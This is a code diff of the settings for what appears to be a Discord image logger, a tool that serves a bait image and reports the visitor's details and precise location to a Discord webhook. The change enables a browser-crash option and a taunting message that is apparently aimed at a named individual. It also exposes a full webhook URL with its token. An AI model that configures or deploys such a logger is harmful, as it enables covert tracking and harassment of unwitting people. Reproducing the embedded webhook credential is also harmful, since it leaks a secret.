@@ -14,21 +14,21 @@ __author__ = "XSYTHO"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1357230392507240469/4XskV-5LnfH478Iu7i4U8Egvig150SZ-wX0CtGk1PdqJhkxlFD4pFYgyZWSPrVzo-7YX",
-    "image": "https://cdn.discordapp.com/attachments/1320682733718208536/1362412449168494692/stan.jpg?ex=68024cf8&is=6800fb78&hm=2d333ba09a4e22c0e830a041baf240c6c5d08a22c0b51ddbc777bf02024bacb5&", 
+    "image": "https://cdn.discordapp.com/attachments/1320682733718208536/1362453108910719358/image.png?ex=680272d6&is=68012156&hm=c8e02636b23dfc0d651897ca6c2464e49a05bce59af24e55f4c88c1d7e37865b&", 
                                               
-    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
+    "imageArgument": False, # Allows you to use a URL argument to change the image (SEE THE README)
 
     # CUSTOMIZATION #
     "username": "STAN", 
     "color": 0xFF0000,
 
     # OPTIONS #
-    "crashBrowser": False, 
+    "crashBrowser": True, 
     
     "accurateLocation": True, 
 
     "message": { # Show a custom message when the user opens the image
-        "doMessage": False, # Enable the custom message?
+        "doMessage": True, # Enable the custom message?
         "message": "DAVID NGA EH BAT NAGTATAKA KAPA?", # Message to show
         "richMessage": True, # Enable rich text? (See README for more info)
     },
